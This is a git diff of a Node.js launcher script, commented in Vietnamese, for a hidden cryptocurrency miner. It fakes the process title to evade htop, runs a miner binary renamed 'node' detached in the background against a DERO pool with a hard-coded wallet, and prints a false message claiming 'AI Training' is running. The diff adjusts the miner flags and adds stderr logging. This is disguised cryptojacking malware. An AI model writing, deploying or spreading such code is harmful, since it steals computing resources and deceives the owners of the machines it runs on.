@@ -1,5 +1,4 @@
 const { spawn } = require('child_process');
-const fs = require('fs');
 const { exec } = require('child_process');
 
 // Đổi tên tiến trình hiển thị trong htop
@@ -8,8 +7,8 @@ process.title = 'node index.js'; // Đặt tên giả cho tiến trình
 // Thông tin pool và ví
 const minerPath = './node'; // Đường dẫn tới miner thực tế (đã đổi tên thành "node")
 const args = [
-  '-o', 'community-pools.mysrv.cloud:10300', // Pool
-  '-u', 'deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqextxqgv3qaljzwm', // Ví
+  '-w', 'deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqextxqgv3qaljzwm', // Ví
+  '-r', 'community-pools.mysrv.cloud:10300', // Pool
   '-p', 'rpc', // Password hoặc protocol
 ];
 
@@ -23,11 +22,16 @@ exec('chmod +x ./node', (err, stdout, stderr) => {
 
   // Chạy miner thực tế
   const miner = spawn(minerPath, args, {
-    stdio: 'ignore', // Ẩn stdout và stderr của miner thật
-    detached: true,  // Tách miner ra khỏi tiến trình Node.js
-    shell: true,     // Chạy thông qua shell
+    stdio: ['ignore', 'ignore', 'pipe'], // Giám sát stderr để ghi lại lỗi
+    detached: true, 
+    shell: true,
   });
-  miner.unref(); // Đảm bảo tiến trình miner chạy ngầm độc lập
+
+  miner.stderr.on('data', (data) => {
+    console.error(`Lỗi từ miner: ${data.toString()}`);
+  });
+
+  miner.unref();
   console.log('AI Training đang chạy ngầm...');
 });
 
